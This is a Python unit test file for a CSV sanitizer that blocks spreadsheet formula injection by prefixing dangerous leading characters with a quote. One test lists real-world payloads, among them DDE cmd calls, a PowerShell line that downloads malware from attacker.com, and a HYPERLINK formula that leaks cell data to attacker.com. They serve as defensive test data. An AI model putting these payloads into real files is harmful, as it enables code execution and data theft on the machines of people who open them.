"""Unit tests for CSV sanitizer."""

from core.helper.csv_sanitizer import CSVSanitizer


class TestCSVSanitizer:
    """Test cases for CSV sanitization to prevent formula injection attacks."""

    def test_sanitize_formula_equals(self):
        """Test sanitizing values starting with = (most common formula injection)."""
        assert CSVSanitizer.sanitize_value("=cmd|'/c calc'!A0") == "'=cmd|'/c calc'!A0"
        assert CSVSanitizer.sanitize_value("=SUM(A1:A10)") == "'=SUM(A1:A10)"
        assert CSVSanitizer.sanitize_value("=1+1") == "'=1+1"
        assert CSVSanitizer.sanitize_value("=@SUM(1+1)") == "'=@SUM(1+1)"

    def test_sanitize_formula_plus(self):
        """Test sanitizing values starting with + (plus formula injection)."""
        assert CSVSanitizer.sanitize_value("+1+1+cmd|'/c calc") == "'+1+1+cmd|'/c calc"
        assert CSVSanitizer.sanitize_value("+123") == "'+123"
        assert CSVSanitizer.sanitize_value("+cmd|'/c calc'!A0") == "'+cmd|'/c calc'!A0"

    def test_sanitize_formula_minus(self):
        """Test sanitizing values starting with - (minus formula injection)."""
        assert CSVSanitizer.sanitize_value("-2+3+cmd|'/c calc") == "'-2+3+cmd|'/c calc"
        assert CSVSanitizer.sanitize_value("-456") == "'-456"
        assert CSVSanitizer.sanitize_value("-cmd|'/c notepad") == "'-cmd|'/c notepad"

    def test_sanitize_formula_at(self):
        """Test sanitizing values starting with @ (at-sign formula injection)."""
        assert CSVSanitizer.sanitize_value("@SUM(1+1)*cmd|'/c calc") == "'@SUM(1+1)*cmd|'/c calc"
        assert CSVSanitizer.sanitize_value("@AVERAGE(1,2,3)") == "'@AVERAGE(1,2,3)"

    def test_sanitize_formula_tab(self):
        """Test sanitizing values starting with tab character."""
        assert CSVSanitizer.sanitize_value("\t=1+1") == "'\t=1+1"
        assert CSVSanitizer.sanitize_value("\tcalc") == "'\tcalc"

    def test_sanitize_formula_carriage_return(self):
        """Test sanitizing values starting with carriage return."""
        assert CSVSanitizer.sanitize_value("\r=1+1") == "'\r=1+1"
        assert CSVSanitizer.sanitize_value("\rcmd") == "'\rcmd"

    def test_sanitize_safe_values(self):
        """Test that safe values are not modified."""
        assert CSVSanitizer.sanitize_value("Hello World") == "Hello World"
        assert CSVSanitizer.sanitize_value("123") == "123"
        assert CSVSanitizer.sanitize_value("test@example.com") == "test@example.com"
        assert CSVSanitizer.sanitize_value("Normal text") == "Normal text"
        assert CSVSanitizer.sanitize_value("Question: How are you?") == "Question: How are you?"

    def test_sanitize_safe_values_with_special_chars_in_middle(self):
        """Test that special characters in the middle are not escaped."""
        assert CSVSanitizer.sanitize_value("A = B + C") == "A = B + C"
        assert CSVSanitizer.sanitize_value("Price: $10 + $20") == "Price: $10 + $20"
        assert CSVSanitizer.sanitize_value("Email: user@domain.com") == "Email: user@domain.com"

    def test_sanitize_empty_values(self):
        """Test handling of empty values."""
        assert CSVSanitizer.sanitize_value("") == ""
        assert CSVSanitizer.sanitize_value(None) == ""

    def test_sanitize_numeric_types(self):
        """Test handling of numeric types."""
        assert CSVSanitizer.sanitize_value(123) == "123"
        assert CSVSanitizer.sanitize_value(456.789) == "456.789"
        assert CSVSanitizer.sanitize_value(0) == "0"
        # Negative numbers should be escaped (start with -)
        assert CSVSanitizer.sanitize_value(-123) == "'-123"

    def test_sanitize_boolean_types(self):
        """Test handling of boolean types."""
        assert CSVSanitizer.sanitize_value(True) == "True"
        assert CSVSanitizer.sanitize_value(False) == "False"

    def test_sanitize_dict_with_specific_fields(self):
        """Test sanitizing specific fields in a dictionary."""
        data = {
            "question": "=1+1",
            "answer": "+cmd|'/c calc",
            "safe_field": "Normal text",
            "id": "12345",
        }
        sanitized = CSVSanitizer.sanitize_dict(data, ["question", "answer"])

        assert sanitized["question"] == "'=1+1"
        assert sanitized["answer"] == "'+cmd|'/c calc"
        assert sanitized["safe_field"] == "Normal text"
        assert sanitized["id"] == "12345"

    def test_sanitize_dict_all_string_fields(self):
        """Test sanitizing all string fields when no field list provided."""
        data = {
            "question": "=1+1",
            "answer": "+calc",
            "id": 123,  # Not a string, should be ignored
        }
        sanitized = CSVSanitizer.sanitize_dict(data, None)

        assert sanitized["question"] == "'=1+1"
        assert sanitized["answer"] == "'+calc"
        assert sanitized["id"] == 123  # Unchanged

    def test_sanitize_dict_with_missing_fields(self):
        """Test that missing fields in dict don't cause errors."""
        data = {"question": "=1+1"}
        sanitized = CSVSanitizer.sanitize_dict(data, ["question", "nonexistent_field"])

        assert sanitized["question"] == "'=1+1"
        assert "nonexistent_field" not in sanitized

    def test_sanitize_dict_creates_copy(self):
        """Test that sanitize_dict creates a copy and doesn't modify original."""
        original = {"question": "=1+1", "answer": "Normal"}
        sanitized = CSVSanitizer.sanitize_dict(original, ["question"])

        assert original["question"] == "=1+1"  # Original unchanged
        assert sanitized["question"] == "'=1+1"  # Copy sanitized

    def test_real_world_csv_injection_payloads(self):
        """Test against real-world CSV injection attack payloads."""
        # Common DDE (Dynamic Data Exchange) attack payloads
        payloads = [
            "=cmd|'/c calc'!A0",
            "=cmd|'/c notepad'!A0",
            "+cmd|'/c powershell IEX(wget attacker.com/malware.ps1)'",
            "-2+3+cmd|'/c calc'",
            "@SUM(1+1)*cmd|'/c calc'",
            "=1+1+cmd|'/c calc'",
            '=HYPERLINK("http://attacker.com?leak="&A1&A2,"Click here")',
        ]

        for payload in payloads:
            result = CSVSanitizer.sanitize_value(payload)
            # All should be prefixed with single quote
            assert result.startswith("'"), f"Payload not sanitized: {payload}"
            assert result == f"'{payload}", f"Unexpected sanitization for: {payload}"

    def test_multiline_strings(self):
        """Test handling of multiline strings."""
        multiline = "Line 1\nLine 2\nLine 3"
        assert CSVSanitizer.sanitize_value(multiline) == multiline

        multiline_with_formula = "=SUM(A1)\nLine 2"
        assert CSVSanitizer.sanitize_value(multiline_with_formula) == f"'{multiline_with_formula}"

    def test_whitespace_only_strings(self):
        """Test handling of whitespace-only strings."""
        assert CSVSanitizer.sanitize_value("   ") == "   "
        assert CSVSanitizer.sanitize_value("\n\n") == "\n\n"
        # Tab at start should be escaped
        assert CSVSanitizer.sanitize_value("\t  ") == "'\t  "
